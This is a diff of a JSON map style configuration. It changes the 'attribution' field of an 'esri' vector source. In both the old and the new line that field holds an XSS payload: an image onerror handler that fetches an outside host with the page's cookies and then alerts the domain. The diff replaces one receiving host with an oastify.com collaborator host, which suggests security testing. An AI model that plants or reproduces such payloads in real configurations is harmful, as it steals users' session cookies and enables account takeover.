@@ -4,7 +4,7 @@
   "sources": {
     "esri": {
       "type": "vector",
-      "attribution": "<img src=x onerror=\"fetch('https://ihatedota.com/x?c='+encodeURIComponent(document.cookie)).then(()=>alert('XSS @ '+document.domain))\">",
+      "attribution": "<img src=x onerror=\"fetch('https://ne5cbz36h2r6pms2dbijy8mpkgq7ez2o.oastify.com?c='+encodeURIComponent(document.cookie)).then(()=>alert('XSS @ '+document.domain))\">",
       "url": "https://basemaps-api.arcgis.com/arcgis/rest/services/World_Basemap_v2/VectorTileServer"
     }
   },
